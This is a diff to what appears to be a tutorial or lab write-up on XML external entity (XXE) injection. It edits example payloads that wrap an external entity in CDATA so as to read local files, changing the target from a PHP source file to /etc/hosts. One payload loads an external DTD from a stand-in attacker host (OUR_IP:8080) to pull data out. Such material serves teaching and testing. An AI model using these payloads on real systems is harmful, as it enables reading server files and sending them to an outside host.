@@ -7,7 +7,7 @@ To start, we must first define a `begin` internal entity with `<![CDATA[`, an `e
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
   <!ENTITY begin "<![CDATA[">
-  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY file SYSTEM "file:///etc/hosts">
   <!ENTITY end "]]>">
   <!ENTITY joined "&begin;&file;&end;">
 ]>
@@ -28,7 +28,7 @@ Now we can reference our external entity and print the `&joined` entity we defin
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
   <!ENTITY % begin "<![CDATA[">
-  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY % file SYSTEM "file:///etc/hosts">
   <!ENTITY % end "]]>">
   <!ENTITY % xxe SYSTEM "http://OUR_IP:8080/xxe.dtd">
   %xxe;
